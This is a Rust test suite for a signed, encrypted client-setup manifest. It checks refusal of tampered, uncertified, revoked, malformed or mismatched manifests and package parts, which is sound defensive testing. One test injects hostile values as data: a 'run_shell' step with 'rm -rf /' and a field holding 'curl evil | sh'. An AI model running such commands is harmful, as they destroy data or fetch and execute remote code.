use super::*;
use crate::keys::generate_encryption_keypair;
use crate::package::{self, Component, ComponentKind};
use crate::provider::test_helpers::{empty_revoked, issued_identity};

const NOW: &str = "2026-10-07 12:00:00";
const NOW_UNIX: u64 = 1_790_000_000;
const ISSUED: u64 = NOW_UNIX - 1000;
const DEVICE: [u8; 16] = [7u8; 16];

struct World {
    identity: ProviderIdentity,
    root: [u8; 32],
    secret: zeroize::Zeroizing<[u8; 32]>,
    public: [u8; 32],
}

fn world() -> World {
    let issued = issued_identity("2099-01-01 00:00:00");
    let (secret, public) = generate_encryption_keypair();
    World {
        identity: ProviderIdentity {
            certificate: issued.certificate,
            relay_private_key: issued.relay_private,
        },
        root: issued.root_public,
        secret,
        public,
    }
}

fn key(seed: u8) -> Vec<u8> {
    let mut bytes = b"KQXB".to_vec();
    bytes.extend_from_slice(&[1, crate::export::BUNDLE_TYPE_API_KEY]);
    bytes.extend_from_slice(&[7u8; 32]);
    bytes.extend_from_slice(&40u32.to_be_bytes());
    bytes.extend_from_slice(&[seed; 40]);
    bytes
}

fn package_of(w: &World, keys: &[&[u8]]) -> package::Package {
    let bytes =
        package::issue_client_package(&w.identity, keys, &w.public, Some(DEVICE), ISSUED, 30)
            .expect("issue");
    package::decode(&bytes).expect("decode")
}

fn manifest_at(package: &package::Package) -> usize {
    package
        .components
        .iter()
        .position(|c| c.kind == ComponentKind::SetupManifest)
        .expect("a manifest")
}

fn opened(w: &World, package: &package::Package) -> Opened {
    open(
        &package.components[manifest_at(package)].bytes,
        &w.secret,
        &w.root,
        NOW,
        &empty_revoked(),
    )
    .expect("opens")
}

fn standard_body(w: &World) -> Body {
    let (one, two) = (key(1), key(2));
    let certificate = hash_of(&w.identity.certificate);
    Body {
        version: VERSION,
        package_id: "ab".repeat(16),
        purpose: "client_setup".into(),
        recipient: hex::encode(w.public),
        device_id: Some(hex::encode(DEVICE)),
        expires_at: NOW_UNIX + 1000,
        operations: standard_operations(&certificate, &[hash_of(&one), hash_of(&two)]),
    }
}

#[test]
fn the_relay_issues_the_standard_steps_and_only_the_recipient_opens_them() {
    let w = world();
    let (one, two) = (key(1), key(2));
    let package = package_of(&w, &[&one, &two]);
    let seen = opened(&w, &package);
    assert_eq!(seen.body.operations.len(), 5);
    assert!(matches!(
        seen.body.operations[0],
        Operation::EnsureIdentity { .. }
    ));
    assert!(matches!(
        seen.body.operations[1],
        Operation::InstallCertificate { .. }
    ));
    assert!(matches!(
        seen.body.operations[2],
        Operation::InstallKey { .. }
    ));
    assert!(matches!(
        seen.body.operations[3],
        Operation::InstallKey { .. }
    ));
    assert!(matches!(
        seen.body.operations[4],
        Operation::UseRelay { .. }
    ));
    assert_eq!(seen.body.package_id, hex::encode(package.id));
    assert_eq!(seen.relay_public_key, package.issuer);
    let (other, _) = generate_encryption_keypair();
    let sealed = &package.components[manifest_at(&package)].bytes;
    assert!(matches!(
        open(sealed, &other, &w.root, NOW, &empty_revoked()),
        Err(Error::InvalidSetupManifest)
    ));
}

#[test]
fn nothing_in_the_sealed_manifest_is_readable_without_the_recipients_key() {
    let w = world();
    let package = package_of(&w, &[&key(1)]);
    let sealed = &package.components[manifest_at(&package)].bytes;
    for needle in [
        "install_key",
        "install_certificate",
        "ensure_identity",
        "client_setup",
    ] {
        assert!(
            !sealed
                .windows(needle.len())
                .any(|window| window == needle.as_bytes()),
            "{needle} is in the clear"
        );
    }
}

#[test]
fn any_changed_byte_of_the_sealed_manifest_is_refused() {
    let w = world();
    let package = package_of(&w, &[&key(1)]);
    let sealed = package.components[manifest_at(&package)].bytes.clone();
    for index in 0..sealed.len() {
        let mut changed = sealed.clone();
        changed[index] ^= 1;
        assert!(
            open(&changed, &w.secret, &w.root, NOW, &empty_revoked()).is_err(),
            "byte {index} changed"
        );
    }
}

/// A manifest the relay key signs exactly as written, sealed to the recipient,
/// for a test that needs a body the issuer would never write.
fn signed_by(w: &World, body_json: &str) -> Vec<u8> {
    let signature = signing::sign(
        &w.identity.relay_private_key,
        &signing::relay_setup_manifest_preimage(body_json.as_bytes()),
    );
    let payload = serde_json::to_vec(&Signed {
        body_json: body_json.to_string(),
        signature: hex::encode(signature),
        certificate: STANDARD.encode(&w.identity.certificate),
    })
    .expect("json");
    envelope::seal(
        EXPORT_BUNDLE,
        BUNDLE_TYPE_SETUP_MANIFEST,
        &w.public,
        &payload,
    )
    .expect("seal")
}

fn open_signed(w: &World, body_json: &str) -> Result<Opened> {
    open(
        &signed_by(w, body_json),
        &w.secret,
        &w.root,
        NOW,
        &empty_revoked(),
    )
}

#[test]
fn a_step_this_version_does_not_know_fails_the_whole_manifest_even_when_signed() {
    let w = world();
    let good = serde_json::to_string(&standard_body(&w)).expect("json");
    assert!(
        open_signed(&w, &good).is_ok(),
        "the control: a signed standard body opens"
    );

    let value: serde_json::Value = serde_json::from_str(&good).expect("value");
    let with = |edit: &dyn Fn(&mut serde_json::Value)| {
        let mut changed = value.clone();
        edit(&mut changed);
        serde_json::to_string(&changed).expect("json")
    };
    let shell = with(&|v| {
        v["operations"]
            .as_array_mut()
            .expect("ops")
            .push(serde_json::json!(
                { "op": "run_shell", "id": "evil", "needs": ["identity"], "cmd": "rm -rf /" }
            ));
    });
    let extra_field =
        with(&|v| v["operations"][1]["command"] = serde_json::json!("curl evil | sh"));
    let extra_body_field = with(&|v| v["run"] = serde_json::json!("anything"));
    let no_tag = with(&|v| {
        v["operations"][0] = serde_json::json!({ "id": "identity" });
    });
    for (name, body) in [
        ("an unknown op", shell),
        ("an unknown field on a known op", extra_field),
        ("an unknown field on the body", extra_body_field),
        ("an op with no tag", no_tag),
    ] {
        assert!(
            matches!(open_signed(&w, &body), Err(Error::InvalidSetupManifest)),
            "{name} must fail the manifest"
        );
    }
}

#[test]
fn a_manifest_the_relay_did_not_sign_or_the_root_did_not_certify_is_refused() {
    let w = world();
    let good = serde_json::to_string(&standard_body(&w)).expect("json");

    // The body changed after it was signed.
    let sealed = signed_by(&w, &good);
    let (_, _, payload) = envelope::open_as(EXPORT_BUNDLE, &sealed, &w.secret).expect("open");
    let mut signed: Signed = serde_json::from_slice(&payload).expect("signed");
    signed.body_json = signed
        .body_json
        .replacen("client_setup", "client_update", 1);
    let altered = envelope::seal(
        EXPORT_BUNDLE,
        BUNDLE_TYPE_SETUP_MANIFEST,
        &w.public,
        &serde_json::to_vec(&signed).expect("json"),
    )
    .expect("seal");
    assert!(open(&altered, &w.secret, &w.root, NOW, &empty_revoked()).is_err());

    // A relay certified by another root.
    let other = issued_identity("2099-01-01 00:00:00");
    assert!(open(
        &sealed,
        &w.secret,
        &other.root_public,
        NOW,
        &empty_revoked()
    )
    .is_err());

    // A revoked certificate, and one that has expired.
    let serial = provider::parse_certificate(&w.identity.certificate)
        .expect("cert")
        .serial;
    let revoked: HashSet<String> = [serial].into();
    assert!(open(&sealed, &w.secret, &w.root, NOW, &revoked).is_err());
    assert!(open(
        &sealed,
        &w.secret,
        &w.root,
        "2100-01-01 00:00:00",
        &empty_revoked()
    )
    .is_err());

    // Sealed to this person but naming someone else.
    let mut elsewhere = standard_body(&w);
    elsewhere.recipient = hex::encode(generate_encryption_keypair().1);
    let json = serde_json::to_string(&elsewhere).expect("json");
    assert!(open_signed(&w, &json).is_err());
}

#[test]
fn the_shape_rules_refuse_a_manifest_no_issuer_would_write() {
    let w = world();
    let good = standard_body(&w);
    good.validate().expect("the standard body is sound");
    type Break = Box<dyn Fn(&mut Body)>;
    let refused: Vec<(&str, Break)> = vec![
        ("no steps", Box::new(|b| b.operations.clear())),
        (
            "too many steps",
            Box::new(|b| {
                for n in 0..MAX_OPERATIONS {
                    b.operations.push(Operation::EnsureIdentity {
                        id: format!("x{n}"),
                        needs: vec![],
                    });
                }
            }),
        ),
        (
            "a repeated step id",
            Box::new(|b| {
                b.operations[2] = Operation::InstallKey {
                    id: "certificate".into(),
                    needs: vec!["certificate".into()],
                    component: "11".repeat(32),
                }
            }),
        ),
        (
            "a need that names nothing",
            Box::new(|b| match &mut b.operations[1] {
                Operation::InstallCertificate { needs, .. } => needs.push("ghost".into()),
                _ => unreachable!(),
            }),
        ),
        (
            "a need on a later step",
            Box::new(|b| match &mut b.operations[1] {
                Operation::InstallCertificate { needs, .. } => needs.push("relay".into()),
                _ => unreachable!(),
            }),
        ),
        (
            "a step that needs itself",
            Box::new(|b| match &mut b.operations[1] {
                Operation::InstallCertificate { needs, .. } => needs.push("certificate".into()),
                _ => unreachable!(),
            }),
        ),
        (
            "the identity not first",
            Box::new(|b| b.operations.swap(0, 1)),
        ),
        (
            "a second identity step",
            Box::new(|b| {
                b.operations.insert(
                    2,
                    Operation::EnsureIdentity {
                        id: "again".into(),
                        needs: vec![],
                    },
                )
            }),
        ),
        (
            "the certificate without the identity",
            Box::new(|b| match &mut b.operations[1] {
                Operation::InstallCertificate { needs, .. } => needs.clear(),
                _ => unreachable!(),
            }),
        ),
        (
            "two certificates",
            Box::new(|b| {
                b.operations.insert(
                    2,
                    Operation::InstallCertificate {
                        id: "certificate-2".into(),
                        needs: vec!["identity".into()],
                        component: "22".repeat(32),
                    },
                )
            }),
        ),
        (
            "a key that does not wait for the certificate",
            Box::new(|b| match &mut b.operations[2] {
                Operation::InstallKey { needs, .. } => needs.clear(),
                _ => unreachable!(),
            }),
        ),
        (
            "the same key twice",
            Box::new(|b| {
                let first = b.operations[2].component().expect("part").to_string();
                if let Operation::InstallKey { component, .. } = &mut b.operations[3] {
                    *component = first;
                }
            }),
        ),
        (
            "a default relay for a key that is not installed",
            Box::new(|b| match b.operations.last_mut() {
                Some(Operation::UseRelay { key, .. }) => *key = "33".repeat(32),
                _ => unreachable!(),
            }),
        ),
        (
            "a default relay that does not wait for its key",
            Box::new(|b| match b.operations.last_mut() {
                Some(Operation::UseRelay { needs, .. }) => needs.clear(),
                _ => unreachable!(),
            }),
        ),
        (
            "two default relays",
            Box::new(|b| {
                let key = b.operations[3].component().expect("part").to_string();
                b.operations.push(Operation::UseRelay {
                    id: "relay-2".into(),
                    needs: vec!["key-2".into()],
                    key,
                });
            }),
        ),
        (
            "a part that is not a hash",
            Box::new(|b| match &mut b.operations[1] {
                Operation::InstallCertificate { component, .. } => *component = "not-a-hash".into(),
                _ => unreachable!(),
            }),
        ),
        (
            "an upper-case hash",
            Box::new(|b| match &mut b.operations[1] {
                Operation::InstallCertificate { component, .. } => *component = "AB".repeat(32),
                _ => unreachable!(),
            }),
        ),
        ("another version", Box::new(|b| b.version = 2)),
        (
            "another purpose",
            Box::new(|b| b.purpose = "provider_recovery".into()),
        ),
        ("a bad recipient", Box::new(|b| b.recipient = "zz".into())),
        (
            "a bad device id",
            Box::new(|b| b.device_id = Some("1234".into())),
        ),
        (
            "a bad package id",
            Box::new(|b| b.package_id = "1234".into()),
        ),
        (
            "a step id with a space or capital",
            Box::new(|b| {
                b.operations[0] = Operation::EnsureIdentity {
                    id: "Bad Id".into(),
                    needs: vec![],
                }
            }),
        ),
    ];
    for (name, edit) in refused {
        let mut body = good.clone();
        edit(&mut body);
        assert!(
            matches!(body.validate(), Err(Error::InvalidSetupManifest)),
            "{name} must be refused"
        );
        assert!(
            seal(&w.identity, &w.public, &body).is_err(),
            "{name}: the relay never signs it"
        );
    }
    // A manifest with no default-relay step, and one with no device binding, are fine.
    let mut plain = good.clone();
    plain.operations.pop();
    plain.device_id = None;
    plain.validate().expect("optional parts");
}

#[test]
fn a_manifest_is_held_to_its_package_its_person_its_drive_and_its_time() {
    let w = world();
    let (one, two) = (key(1), key(2));
    let package = package_of(&w, &[&one, &two]);
    let at = manifest_at(&package);
    let body = opened(&w, &package).body;
    let check = |body: &Body,
                 package: &package::Package,
                 recipient: &[u8; 32],
                 device: &[u8; 16],
                 now: u64| {
        body.check_against(package, manifest_at(package), recipient, device, now)
    };
    check(&body, &package, &w.public, &DEVICE, ISSUED + 10).expect("the control");
    let _ = at;

    // Another package's manifest in this one.
    let other = package_of(&w, &[&one, &two]);
    assert!(matches!(
        check(
            &opened(&w, &other).body,
            &package,
            &w.public,
            &DEVICE,
            ISSUED + 10
        ),
        Err(Error::InvalidSetupManifest)
    ));
    // Another person, another drive, past its end, the wrong purpose.
    assert!(check(
        &body,
        &package,
        &generate_encryption_keypair().1,
        &DEVICE,
        ISSUED + 10
    )
    .is_err());
    assert!(check(&body, &package, &w.public, &[9u8; 16], ISSUED + 10).is_err());
    assert!(check(&body, &package, &w.public, &DEVICE, body.expires_at).is_err());
    let mut update = body.clone();
    update.purpose = "client_update".into();
    assert!(check(&update, &package, &w.public, &DEVICE, ISSUED + 10).is_err());
    // A manifest that binds no device accepts any drive.
    let mut loose = body.clone();
    loose.device_id = None;
    check(&loose, &package, &w.public, &[9u8; 16], ISSUED + 10).expect("no device binding");
}

#[test]
fn every_part_of_the_package_is_used_by_exactly_one_step() {
    let w = world();
    let (one, two) = (key(1), key(2));
    let package = package_of(&w, &[&one, &two]);
    let body = opened(&w, &package).body;
    let run = |package: &package::Package| {
        body.check_against(
            package,
            manifest_at(package),
            &w.public,
            &DEVICE,
            ISSUED + 10,
        )
    };
    run(&package).expect("the control");

    // A part no step names rides along: refused.
    let mut extra = package.clone();
    extra.components.insert(
        0,
        Component {
            kind: ComponentKind::ApiKeyBundle,
            bytes: key(9),
        },
    );
    assert!(matches!(run(&extra), Err(Error::KqpkgComponentRejected)));

    // A part a step names is gone.
    let mut missing = package.clone();
    let at = missing
        .components
        .iter()
        .position(|c| c.bytes == two)
        .expect("key");
    missing.components.remove(at);
    assert!(matches!(run(&missing), Err(Error::KqpkgComponentRejected)));

    // A step's part is swapped for different bytes (hash no longer matches).
    let mut swapped = package.clone();
    let at = swapped
        .components
        .iter()
        .position(|c| c.bytes == one)
        .expect("key");
    swapped.components[at].bytes = key(5);
    assert!(matches!(run(&swapped), Err(Error::KqpkgComponentRejected)));

    // A step names a part of the wrong kind: the certificate step names a key.
    let mut wrong = body.clone();
    if let Operation::InstallCertificate { component, .. } = &mut wrong.operations[1] {
        *component = hash_of(&one);
    }
    assert!(wrong
        .check_against(
            &package,
            manifest_at(&package),
            &w.public,
            &DEVICE,
            ISSUED + 10
        )
        .is_err());
}
